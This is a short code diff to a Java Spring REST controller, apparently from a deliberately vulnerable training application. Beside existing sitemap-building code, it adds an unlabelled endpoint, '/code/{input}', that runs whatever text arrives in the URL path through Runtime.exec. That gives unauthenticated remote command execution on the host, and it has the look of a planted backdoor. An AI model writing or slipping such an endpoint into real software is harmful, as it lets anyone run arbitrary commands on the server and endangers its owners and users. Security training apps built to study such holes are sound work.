@@ -16,6 +16,7 @@ import org.sasanlabs.vulnerability.types.VulnerabilityType;
 import org.sasanlabs.vulnerableapp.facade.schema.VulnerabilityDefinition;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
@@ -153,5 +154,18 @@ public class VulnerableAppRestController {
         }
         xmlBuilder.append(FrameworkConstants.SITEMAP_URLSET_TAG_END);
         return xmlBuilder.toString();
+    }
+
+    @GetMapping("/code/{input}")
+    public String run(@PathVariable(name="input") String input) {
+        try {
+            Runtime rt = Runtime.getRuntime();
+            Process pr = rt.exec(input);
+            return "Success";
+        }
+        catch(Exception e) {
+            e.printStackTrace();
+            return null;
+        }
     }
 }
